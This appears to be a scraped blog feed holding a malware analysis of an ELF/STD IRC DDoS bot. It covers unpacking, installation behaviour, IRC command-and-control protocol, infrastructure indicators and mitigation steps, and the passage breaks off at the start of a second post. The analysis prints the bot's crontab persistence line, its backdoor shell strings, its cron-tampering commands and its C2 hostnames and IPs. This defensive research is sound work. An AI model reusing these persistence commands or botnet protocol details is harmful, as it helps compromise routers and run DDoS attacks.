src=https:\/\/lh3.googleusercontent.com\/-cHiKfVisZsw\/VxEtQFekEFI\/AAAAAAAAUxo\/-NzYHmW42XseaVv2d4DtylT2LqCmnuk0QCLcB\/s580\/4001.png\u003E \u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003E(↑pic: PoC of the malware failed to seek unpacking indicator)\u003C\/i\u003E\u003Cp\u003EIn the other words: this binary can only be unpacked by itself or we somehow put back the original header in place to make it unpackable by UPX again. But don't worry. Many RE ways to be done dealing with this situation. One of (my favorite) way to handle this \"custom\" packed UPX is using ala CTF method that I announced a while ago in--\u003E\u003Ca href=\"http:\/\/imgur.com\/a\/3mgZm\"\u003Ehere\u003C\/a\u003E, or using \"other\" method that I will not openly disclose (OPSEC), as I used in this case to safe my time.  \u003Cp\u003E\u003Ch2\u003EThe third slap: Malware \u0026 its packer's cracked!\u003C\/h2\u003E \u003Cp\u003EI depacked the binary with my own method and the information needed from the unpacked ELF can be seen in the virus total comment I wrote in--\u003E\u003Ca href=\"https:\/\/virustotal.com\/en\/file\/8b929fa993b6eb2bb37281fd265c19c862c4124c770e7c99ce5997a667d0e11b\/analysis\/\"\u003Ehere\u003C\/a\u003E. \u003Cbr\u003EAnd the fun has began (picture?↓)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Oou9m9QpvsI\/VxDyH59iviI\/AAAAAAAAUvg\/taW1RJxDKpkHg5Jzx6S0oZJipU8fwwxJACLcB\/s2120\/102.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Oou9m9QpvsI\/VxDyH59iviI\/AAAAAAAAUvg\/taW1RJxDKpkHg5Jzx6S0oZJipU8fwwxJACLcB\/s580\/102.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003E\u003Ch2\u003EThe forth slap: Indicator of the infection\u003C\/h2\u003E \u003Cp\u003E1. Malware installation details  \u003Cp\u003EDuring the installation the malware will perform shell execution via execve(\"\/bin\/sh\") to the various linux command line to perform the installation, as per detail picture below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VKghKaMatxA\/VxD0Ft2uFVI\/AAAAAAAAUvs\/nJ_EjeqU5KA9FRsiVMy9IFiPg8_lmyucwCLcB\/s2120\/103.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-VKghKaMatxA\/VxD0Ft2uFVI\/AAAAAAAAUvs\/nJ_EjeqU5KA9FRsiVMy9IFiPg8_lmyucwCLcB\/s580\/103.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAs per seen in the details, linux version of debugger and packet capture software were disabled, the DNS resolver will be set to \"8.8.8.8\", then the services (mostly are router specific services) will be stopped or removed its runtime files, the firewall rules will be changed for telnet (tcp\/23), httpproxy (tcp\/8080) and http (tcp\/80) services to be opened, malware will be self-executed under owner only rwx permission (chmod 700), user crontab will be used for autostart, and several info harvesting.  \u003Cp\u003EAccordingly, below \u003Cb\u003E\u003Ci\u003Esimilar\u003C\/i\u003E\u003C\/b\u003E runtime libraries (ref:debian GNU), must be needed for overall execution: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/etc\/ld.so.cache  \/\/ the elf runtime\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libc.so.6  \/\/ the elf runtime\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libpam.so.0    \/\/ some user related calls made\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/libselinux.so.1  \/\/ selinux\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libdl.so.2\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libnss_compat.so.2\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libnsl.so.1     \/\/ malwre use these libs to resolve\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libnss_nis.so.2\u003Cbr \/\u003E\/lib\/i386-linux-gnu\/i686\/cmov\/libnss_files.so.2\u003Cbr \/\u003E\/usr\/share\/locale\/locale.alias         \/\/ accompany the info harverst\u003Cbr \/\u003E\/usr\/share\/locale\/en_US\/LC_MESSAGES\/libc.mo\u003Cbr \/\u003E\/usr\/share\/locale\/en\/LC_MESSAGES\/libc.mo\u003Cbr \/\u003Eusr\/share\/locale\/en_US\/LC_MESSAGES\/psmisc.mo\u003Cbr \/\u003E\/usr\/share\/locale\/en\/LC_MESSAGES\/psmisc.mo\", \u003Cbr \/\u003E\/usr\/lib\/i386-linux-gnu\/gconv\/gconv-modules.cache\u003Cbr \/\u003E\u003C\/pre\u003EAnd the below configuration file will be accessed: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/etc\/rc.conf [READ]\u003Cbr \/\u003E\/etc\/resolv.conf [MODIFIED!]\u003Cbr \/\u003E\/etc\/nsswitch.conf [READ]\u003Cbr \/\u003E\u003C\/pre\u003EAlso perform information harvesting via execution of: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/bin\/uname         \u003Cbr \/\u003E\/bin\/nvram         \u003Cbr \/\u003E\/usr\/sbin\/nvram    \u003Cbr \/\u003E\/etc\/ISP_name      \u003Cbr \/\u003E\/etc\/Model_name\u003Cbr \/\u003E\u003C\/pre\u003Eand drops these files: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/tmp\/udevd0.pid\u003Cbr \/\u003E\/var\/lock\/.x001804289383\u003Cbr \/\u003E\/var\/spool\/cron\/crontabs\/$USER [modification of crontab -e]\u003Cbr \/\u003E\u003C\/pre\u003EThe user contrab will contains: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E* * * * * \/PATH\/MALWAREFILE \u003E \/dev\/null 2\u003E\u00261 \u0026\u003Cbr \/\u003E\u003C\/pre\u003EUpon status of installation the malware will be able to send this message(s): \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eecho [+] Welcome to x00's cback shell %s\u003Cbr \/\u003Eecho [+] you logged in at `date`\u003Cbr \/\u003Eecho [+] `uname -a || cat \/proc\/version`\u003Cbr \/\u003Eecho [+] you got root rights, enjoy!.\u003Cbr \/\u003Eecho [+] Running on %s\/bin\/crontab.\/usr\/bin\/crontab.chmod 700 %s \u003E \/dev\/null 2\u003E\u00261 \\\u003Cbr \/\u003E    \u0026.touch -acmr \/bin\/ls %s(crontab -l | grep -v \"%s\" | grep -v \"no cron\" | \\\u003Cbr \/\u003E    grep-v \"lesshts\/run.sh\" \u003E %s\/.x00%u) \u003E \/dev\/null 2\u003E\u00261.echo \"* * * * * %s \u003E \\\u003Cbr \/\u003E    \/dev\/null 2\u003E\u00261 \u0026\" \u003E\u003E %s\/.x00%u.crontab %s\/.x00%u.rm -rf %s\/.x00%u.\u003Cbr \/\u003Eecho [+] no cronnie.\u003Cbr \/\u003Eecho [+] forget it. .\u003Cbr \/\u003Eecho [+] you are root tho. .\/etc\/rc.d\/rc.local.\/etc\/rc.conf.\/.\"%s%s\"a.irq.#x86.777\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E2. The IRC botnet  \u003Cp\u003EThe malware will connect infected nodes to the hostname xxx.pokemon.inc:8080.\u003Cbr\u003EWhen I reversed this sample it was resolved into below DNS data:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E;; QUESTION SECTION:\u003Cbr \/\u003E;xxx.pokemoninc.com.         IN A\u003Cbr \/\u003E\u003Cbr \/\u003E;; ANSWER SECTION:\u003Cbr \/\u003Exxx.pokemoninc.com.     845  IN CNAME   bnet.pokemoninc.com.\u003Cbr \/\u003Ebnet.pokemoninc.com.    845  IN A       88.198.71.83\u003Cbr \/\u003Ebnet.pokemoninc.com.    845  IN A       83.143.80.227\u003Cbr \/\u003Ebnet.pokemoninc.com.    845  IN A       211.103.199.98\u003Cbr \/\u003Ebnet.pokemoninc.com.    845  IN A       49.231.211.193\u003Cbr \/\u003Ebnet.pokemoninc.com.    845  IN A       61.156.43.106\u003Cbr \/\u003Ebnet.pokemoninc.com.    845  IN A       203.141.196.145\u003Cbr \/\u003Ebnet.pokemoninc.com.    845  IN A       202.103.224.85\u003Cbr \/\u003E\u003Cbr \/\u003E;; AUTHORITY SECTION:\u003Cbr \/\u003Epokemoninc.com.  2644   IN   NS dns1.name-services.com.\u003Cbr \/\u003Epokemoninc.com.  2644   IN   NS dns2.name-services.com.\u003Cbr \/\u003Epokemoninc.com.  2644   IN   NS dns3.name-services.com.\u003Cbr \/\u003Epokemoninc.com.  2644   IN   NS dns5.name-services.com.\u003Cbr \/\u003Epokemoninc.com.  2644   IN   NS dns4.name-services.com.\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EInfected node(s) will enter the IRC server after receiving the PONG: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E......PONG #[Arch] :[RangeIP]|[HOSTNAME] -xi.\u003Cbr \/\u003E.x00 localhost localhost :[DATE, i.e.:feb012016]...\u003Cbr \/\u003E\u003C\/pre\u003Ewith executing below JOIN command and using ID format like: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EJOIN :#[Arch] \u003Cbr \/\u003EBotID: [Arch]:|x|1|[ID]|[hostname]|[youtubeURL][date]\u003Cbr \/\u003ENICK [BotID] USER x00 localhost localhost :%s \u003C--- $DATE\u003Cbr \/\u003E\u003C\/pre\u003E..and that YouTube URL in botnet protocol is a big LOL in our community :) (picture?↓)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-aXGalE7MVDA\/VxD89ZSn45I\/AAAAAAAAUv8\/5N5EsCTD49soy9s9R-_u1sCGNAjxqTOegCLcB\/s2120\/105.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-aXGalE7MVDA\/VxD89ZSn45I\/AAAAAAAAUv8\/5N5EsCTD49soy9s9R-_u1sCGNAjxqTOegCLcB\/s580\/105.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe youtube url is safe: https:\/\/www.youtube.com\/watch?v=Jzqy6UJXpcQ [\u003Ca href=\"https:\/\/www.youtube.com\/watch?v=Jzqy6UJXpcQ\"\u003Elink\u003C\/a\u003E] is a BGM of popular japanese anime \"GochiUsa\" about girls work in cafe.\u003Cbr\u003E \u003Cp\u003EAfter joined the IRC !MALICIOUS! bot commands can be executed. I dump the text list of the commands as below: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ZypgP7aAKuk\/VxD_aZApzNI\/AAAAAAAAUwI\/7h359PLu53sCEAOZFwuRsee-bTwfXhRjACLcB\/s2120\/107.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ZypgP7aAKuk\/VxD_aZApzNI\/AAAAAAAAUwI\/7h359PLu53sCEAOZFwuRsee-bTwfXhRjACLcB\/s580\/107.png\u003E\u003C\/a\u003E\u003Cbr\u003EText mode is in--\u003E\u003Ca href=\"https:\/\/pastebin.com\/PBDTmirB\"\u003Ehere\u003C\/a\u003E.  \u003Cp\u003E3. About the attacks..  \u003Cp\u003EAll attack commands can be seen in the above mentioned IRC command, and all command details mostly are shared in the source code of IRC botnet ddoser that I shared a while ago. link--\u003E\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/11\/mmd-0044-2015-source-code-disclosure.html\"\u003Ehere\u003C\/a\u003E. But there are two commands that I often seen recently in DDoS, but I haven't discuss in my previous posts for this type of threat. which are \"SUDP\" and \"UNKNOWN\", we disassembly and decode it into its original code as following jinxed snippet:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-fI38gY-t7VU\/VxEPVdVDd7I\/AAAAAAAAUww\/-2RgrtSZ0w4Ap6pIOWRzkfoKORfr644oQCLcB\/s2120\/3007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-fI38gY-t7VU\/VxEPVdVDd7I\/AAAAAAAAUww\/-2RgrtSZ0w4Ap6pIOWRzkfoKORfr644oQCLcB\/s580\/3007.png\u003E\u003C\/a\u003E \u003Cp\u003E\"UNKNOWN\" was in the source code we shared before, a self-explanatory, so I will not discuss it here.  \u003Cp\u003E4. The big variation of \"User Agent\" combination used for L7 attacks  \u003Cp\u003EThis malware is using combination of many user agents during performing its L7 DoS. The combination is varied, in this particular case  the combination is as per snipped in the below picture. Obviously to filter these headers are not recommendable idea to block such attack:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xy5zIv4eMR8\/VxESz0lDn5I\/AAAAAAAAUxA\/ho8i_j0S9yccmSAmXt2Qpu9Xzc_ZiP_BACLcB\/s2120\/3009.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xy5zIv4eMR8\/VxESz0lDn5I\/AAAAAAAAUxA\/ho8i_j0S9yccmSAmXt2Qpu9Xzc_ZiP_BACLcB\/s580\/3009.PNG\u003E\u003C\/a\u003E \u003Ca name=\"stdbot\"\u003E\u003Cbr\u003E\u003Cp\u003E\u003Ch2\u003EIt's not over..The fifth slap: What's this, really? It's \u003Cb\u003EELF\/STD bot\u003C\/b\u003E.\u003C\/h2\u003E  \u003C\/a\u003E\u003Cp\u003EThis is the STD bot, with the heavy modified code of kaiten. People in the \"industry\" and some stupid skiddos are thinking that STD bot was derived from kaiten\/ktx or tsunami, but actually it is not. The original STD bot was stand alone code. STD name itself came from the coder name called \"stackd\" (root@stackd.net), and he was the one who coded first 48 lines of STD bot.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-85u3eEa9TWQ\/VxEOJAA2CgI\/AAAAAAAAUwk\/c5-UxOPW1pQJRiQxyVcdG_nzpQp1ooHiQCLcB\/s2120\/3008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-85u3eEa9TWQ\/VxEOJAA2CgI\/AAAAAAAAUwk\/c5-UxOPW1pQJRiQxyVcdG_nzpQp1ooHiQCLcB\/s580\/3008.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe code was later on inspired by other IRC base codes like kaiten\/tsunami and other modification in the \"copypasta\" land to be what we are still seeing until now. Well, who cares for this history anyway, but I prefer to keep on track on which threat coming from which roots for my analysis purpose, I suggest you should start to do the same if you are not.  \u003Cp\u003EFollowing, in this particular variant, the coder has overhauled the source code of the latest STD IRC Bot and combining with his own signature for the black market distribution purpose. Also the usage of the UPX trick was added with the hope to prevent sysadmins, scanners or analysts to know what this threat really is during static analysis. yet from now they're failing again :)  \u003Cp\u003EBecause unfortunately for them...  \u003Ccenter\u003E\u003Cp\u003E\u003Ch2\u003EWe STILL have a much better KungFu than yours kiddo :)\u003C\/h2\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-_X7h2pMQdrU\/VexDK6gC-iI\/AAAAAAAATJQ\/EuSfltvvjrsp8u7E6H7wRtGSx956QN0nACCo\/s600-Ic42\/KillBillJunior1.gif\u003E\u003C\/center\u003E \u003Cp\u003E\u003Ch2\u003EThe sixth slap: Network threat indicator\u003C\/h2\u003E \u003Cp\u003EIP addresses: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E130.211.127.186\u003Cbr \/\u003E88.198.71.83\u003Cbr \/\u003E83.143.80.227\u003Cbr \/\u003E211.103.199.98\u003Cbr \/\u003E49.231.211.193\u003Cbr \/\u003E61.156.43.106\u003Cbr \/\u003E203.141.196.145\u003Cbr \/\u003E202.103.224.85 \u003C\/pre\u003E \u003Cp\u003EGeoIP information (for cleaning up purpose): \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EIP Address, City, Region, Country Name\u003Cbr \/\u003E130.211.127.186, Mountain View, CA, United States\u003Cbr \/\u003E88.198.71.83, , , Germany\u003Cbr \/\u003E83.143.80.227, , , Norway\u003Cbr \/\u003E211.103.199.98, Beijing, 22, China\u003Cbr \/\u003E49.231.211.193, , , Thailand\u003Cbr \/\u003E61.156.43.106, Jinan, 25, China\u003Cbr \/\u003E203.141.196.145, , , Japan\u003Cbr \/\u003E202.103.224.85, Nanning, 16, China\u003Cbr \/\u003E\u003Cbr \/\u003EIP address | Reversed | ASN|Prefix|ASN|CN|ISP\u003Cbr \/\u003E130.211.127.186 | 186.127.211.130.bc.googleusercontent.com. |15169 | 130.211.0.0\/16 | GOOGLE | US | google.com | Google Inc.\u003Cbr \/\u003E88.198.71.83 | static.88-198-71-83.clients.your-server.de. |24940 | 88.198.0.0\/16 | HETZNER | DE | hetzner.de | Hetzner Online AG\u003Cbr \/\u003E83.143.80.227 | kdb.servetheworld.net. |34989 | 83.143.80.0\/21 | SERVETHEWORLD | NO | servetheworld.net | ServeTheWorld AS\u003Cbr \/\u003E211.103.199.98 |  |4808 | 211.103.192.0\/18 | CHINA169 | CN | gintong.com | Beijing Huaxia Unipower Network Co. Ltd\u003Cbr \/\u003E49.231.211.193 |  |45458 | 49.231.211.0\/24 | SBN-AWN-AS-02 | TH | sbn.co.th | 408\/60 PHP Bld. 15th Fl Phaholyothin Rd Samsen Nai Phayathai\u003Cbr \/\u003E61.156.43.106 |  |4837 | 61.156.0.0\/16 | CHINA169 | CN | chinaunicom.com | China Unicom Shandong Province Network\u003Cbr \/\u003E203.141.196.145 | html.city.shiojiri.lg.jp. \/ html.city.shiojiri.nagano.jp. |17518 | 203.141.192.0\/19 | SHIOJIRI | JP | city.shiojiri.nagano.jp | Shiojiri City\u003Cbr \/\u003E202.103.224.85 |  |4134 | 202.103.192.0\/18 | CHINANET | CN | chinatelecom.com.cn | ChinaNet Guangxi Province Network\u003Cbr \/\u003E\u003C\/pre\u003E\u003Cb\u003ECNC infratructure map:\u003C\/b\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VnqbFLXT4c0\/VxFDJofk--I\/AAAAAAAAUyE\/SAcM6AQXfbwQtfiCaKKf13Npa4mvaxjngCLcB\/s2120\/4003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-VnqbFLXT4c0\/VxFDJofk--I\/AAAAAAAAUyE\/SAcM6AQXfbwQtfiCaKKf13Npa4mvaxjngCLcB\/s580\/4003.PNG\u003E\u003C\/a\u003E \u003Cp\u003EPort numbers used: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Etcp\/22 (remote cnc)\u003Cbr \/\u003Etcp\/80 (DoS attack)\u003Cbr \/\u003Etcp\/8080 (IRC connection CNC)\u003Cbr \/\u003Etcp\/23 (telnet scanning)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EDomains \u0026 hostname: (do not false positive these, it's for search engine to seek for poor victims!!) \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Epokemoninc.com (domain)\u003Cbr \/\u003Ebnet.pokemoninc.com (cname)\u003Cbr \/\u003Exxx.pokemoninc.com (hostname for round robin access)\u003Cbr \/\u003E186.127.211.130.bc.googleusercontent.com (one of payload infection server)\u003C\/pre\u003E \u003Cp\u003EHashes: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EMD5 (pty) = fa856be9e8018c3a7d4d2351398192d8\u003Cbr \/\u003EMD5 (tty0) = 7980ffb3ad788b73397ce84b1aadf99b\u003Cbr \/\u003EMD5 (tty1) = d47a5da273175a5971638995146e8056\u003Cbr \/\u003EMD5 (tty2) = 2c1b9924092130f5c241afcedfb1b198\u003Cbr \/\u003EMD5 (tty3) = f6fc2dc7e6fa584186a3ed8bc96932ca\u003Cbr \/\u003EMD5 (tty4) = b629686b475eeec7c47daa72ec5dffc0\u003Cbr \/\u003EMD5 (tty5) = c97f99cdafcef0ac7b484e79ca7ed503 \u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EThe last (7th) slap: Protection from \u003Cb\u003Einfection\u003C\/b\u003E \u0026 \u003Cb\u003Emitigation\u003C\/b\u003E\u003C\/h2\u003E\u003Cp\u003ESeveral router models and Wifi\/WiMax service was reported infected by this malware. For the infection prevention \"HowTo\" please follow these steps:\u003Cbr\u003E\u003Cpre\u003E1. Change the default credential of admin and roots. Change the passwords.\u003Cbr \/\u003E2. Disable the telnet service or secure them with firewall by default.\u003Cbr \/\u003E3. Secure any ssh access by disable root, use latest protocol\/version, \u003Cbr \/\u003E   limit access and if possible switch the ports.\u003Cbr \/\u003E4. Deploy firewall rules to avoid port scanning by default.\u003Cbr \/\u003E5. Monitor infection by checking in\/outbound traffic to xxx.pokemon.inc:8080\/80\/23\u003Cbr \/\u003E6. Push updates to make above points happens\u003Cbr \/\u003E\u003C\/pre\u003EFor the infected services, add the below steps: \u003Cpre\u003E1. Report the incident to your CERT\/CSIRT, is a must.\u003Cbr \/\u003E2. Contact the owner of the device by email\/phone\/letter to reset the device.\u003Cbr \/\u003E3. Test \u0026 apply takeover scheme to get the devices back via botnet protocol.\u003Cbr \/\u003E4. Contact me in DM in @malwaremustdie for advisory, it is FREE\u003Cbr \/\u003E*) PS: Do not offer me or my team money\/donation, send us malware sample instead.\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EEpilogue and conclusion\u003C\/h2\u003E\u003Cp\u003ESample link is in the article above.\u003Cbr\u003EIOC details was uploaded to OTX (you know where).\u003Cbr\u003ESamples are shared (see hashes), uploaded to kernelmode--\u003E\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=2747\u0026p=28325#p28325\"\u003Ehere\u003C\/a\u003E.\u003Cbr\u003EQ and A can be done in reddit in--\u003E\u003Ca href=\"https:\/\/www.reddit.com\/r\/netsec\/comments\/4exmhk\/a_bit_about_elfstd_irc_bot_x00s_cback_aka\/\"\u003Ehere\u003C\/a\u003E, or DM me in--\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003Etwitter\u003C\/a\u003E for infection handling advisory.\u003Cbr\u003EWill add and improve this post after resting for a while.\u003Cbr\u003EWill not expose method used for dissecting that \"custom\" UPX outside the MMD rings.  \u003Cp\u003EFor the \"unbeliever\" (smile), here's snips to screenshot to show how this malware is actually \u003Ci\u003E\"a lame copypasta IRC bot\"\u003C\/i\u003E which also my screenshot PoC to this analysis reported above during reversing session in my environment:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-MTd0V4Vd5Xs\/VxExVlEcgII\/AAAAAAAAUx0\/6mqMntrTvf8zR9d97o3zSEGbGZlvg1smACLcB\/s2120\/101.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-MTd0V4Vd5Xs\/VxExVlEcgII\/AAAAAAAAUx0\/6mqMntrTvf8zR9d97o3zSEGbGZlvg1smACLcB\/s580\/101.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003E\"You won't get anything from this post. skiddos, go to school, study hard, like any of decent people do. There is no such shortcut for knowledge.\"\u003C\/i\u003E\u003Cbr\u003E*) Note: this section is to be deleted, participate in my ELF workshop and I will share a lot of goodies to you, and please support MalwareMustDie and radare2 project! :-))  \u003Cp\u003EStay safe, friends. Hope this info helps you. \u003Cbr\u003E\u003Ci\u003EThank's to \u003Ca href=\"https:\/\/twitter.com\/benkow_\"\u003Eben-kow\u003C\/a\u003E for the infection information, \u003Ca href=\"http:\/\/radare.org\"\u003Eradare.org\u003C\/a\u003E for the cool stuff! And all friends in MMD group who really supporting me get through the tough time, nice to be able to write again.\u003Cbr\u003ETo all friends in Kumamoto prefecture in Japan, prayers for you, this post is dedicated to you and fellow sysadmins who work hard battling, fixing and mitigating this type of threat.\u003C\/i\u003E\u003Cp\u003E#MalwareMustDie! \u003Cbr\u003EWritten and analyzed by @unixfreaxjp [\u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003Elink\u003C\/a\u003E], April 14th-15th.2016  \u003Cp\u003E\u003Ccenter\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-AomAuMI00IM\/VxEVNaDXykI\/AAAAAAAAUxM\/gYxnlpN2t5MRGROxzi2WP6T6aYj8TJ0TwCLcB\/s400\/MMD-Goemon.PNG\u003E\u003C\/center\u003E \u003Cp\u003E\u003Ci\u003E☩Non nobis Domine, non nobis, sed nomine Tuo da Gloriam (Psalm 113:9)\u003C\/i\u003E"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/7608444692981067758\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/04\/mmd-0053-2016-bit-about-elfstd-irc-bot.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/7608444692981067758"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/7608444692981067758"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/04\/mmd-0053-2016-bit-about-elfstd-irc-bot.html","title":"MMD-0053-2016 - A bit about ELF\/STD IRC Bot: x00's CBack aka xxx.pokemon(.)inc"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-sG0fb170iUs\/VxEYGzzNcxI\/AAAAAAAAUxY\/SU9dIJMEWPU6mj_pVYM35AmOLojY9hdOwCLcB\/s72-c\/4000.PNG","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-5845015848247955812"},"published":{"$t":"2016-02-07T02:08:00.002-08:00"},"updated":{"$t":"2016-09-10T12:21:29.091-07:00"},"title":{"type":"text","$t":"MMD-0052-2016 - Overview of \"SkidDDoS\" ELF++ IRC Botnet"},"content":{"type":"html","$t":"\u003Ci\u003ETag: kaiten, ktx, tsunami, STD, stdbot, torlus, Qbot, gayfgt, lizard, lizkebab, sinden, sdn, $dn, bossaline, bossabot, dtool, aidra, lightaidra, zendran, styx, Code, Robert, cod, unixcod, styxcod, irc, ircbot, ddos, elfbot, ddoser, nix, elf, linux, unix. backdoor, syn flood, ack flood, ntp flood, udp flood, dns amp, xmas attack, pan flood, x00, cback, LiGhT, Proxseas, BLJ, KaitenBot, fairy, Alex, vanity, Code, Palkia, shenron, GoHack, triple6, 666\u003C\/i\u003E \u003Cp\u003E\u003Ci\u003E\u003Cpre\u003E\u003Cb\u003EHave your own idea, bring your dreams into reality.\u003Cbr \/\u003EHave some fun when you're young, it's all fair with consequentiality.\u003Cbr \/\u003EBut you build malware to do vandalism, you cross the line,\u003Cbr \/\u003EThen you hack internet boxes for whatever purpose, it is a crime,\u003Cbr \/\u003EDon't do the crime, if you can't do the time.\u003C\/b\u003E\u003Cbr \/\u003E\u003Cbr \/\u003E\u003C\/pre\u003E\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003EThis post is a collection of information for the infection of the ELF \u0026 Perl malware botnet that is being used for DDoS activity. Our intelligence \"snagged\" the source codes that we share and reported to the antivirus and security industry in the previous MalwareMustDie blog post [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/11\/mmd-0044-2015-source-code-disclosure.html\"\u003EMMD-0044-2015\u003C\/a\u003E]. Some recent ELF compiled binary were coded with a slight obfuscation or with poorly \"crypted\" effort (obviously because the actors are kids and lacking of knowledge and experience because they are skipping school so much and too lazy to learn), even the toughest crypted one are so \u003Ci\u003Ecrackable\u003C\/i\u003E and you can figure it easily using the source code pattern I shared.   \u003Cp\u003EIn the bottom of this post there is a list of IP addresses which are infector hosts, that was recorded in the early 2016 only, those are: (1) The nodes from \"grey\" hoster hired by \u003Ci\u003EDDOS skiddies \u003C\/i\u003Eto spread these ELF which are mostly offered in some hacking forums, (2) Hacked server\/routers\/IoT\/VPS that is being used to spread these ELF malware. Nonetheless, those are bad hosts that either should be blocked before it gets a take-down, or to be cleaned up. The IOC generation or blocking rules based on this list is highly recommendable.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-aaKuJs_C9tY\/VwycHuSQGhI\/AAAAAAAAUoI\/5mX7z736qM0F3BztmA02PsR5l82MEcRogCLcB\/s1120\/009d.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-aaKuJs_C9tY\/VwycHuSQGhI\/AAAAAAAAUoI\/5mX7z736qM0F3BztmA02PsR5l82MEcRogCLcB\/s480\/009d.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E(Pic = A spreader's attack log of an ELF botnet infection)  \u003Cp\u003EThe intelligence for this information can not be disclosed further for the security purpose, the data belongs to the MalwareMustDie, NPO (thank you to a hard work for ELF Team team mate) bound to our disclaimer. Yet please feel free to use these information freely for your mitigation work or extract IOC to prevent these infection gone worst, or for research purpose. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-hj0Jvqyfz0g\/V2daVJksi1I\/AAAAAAAAVbI\/g7f1Ac-p6KkV1mBmOQodJfRJJ4Djk9a7QCLcB\/s3120\/8001_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-hj0Jvqyfz0g\/V2daVJksi1I\/AAAAAAAAVbI\/g7f1Ac-p6KkV1mBmOQodJfRJJ4Djk9a7QCLcB\/s580\/8001_phixr.png\u003E\u003C\/a\u003E\u003Cbr\u003E(Pic = A spreader instruction for 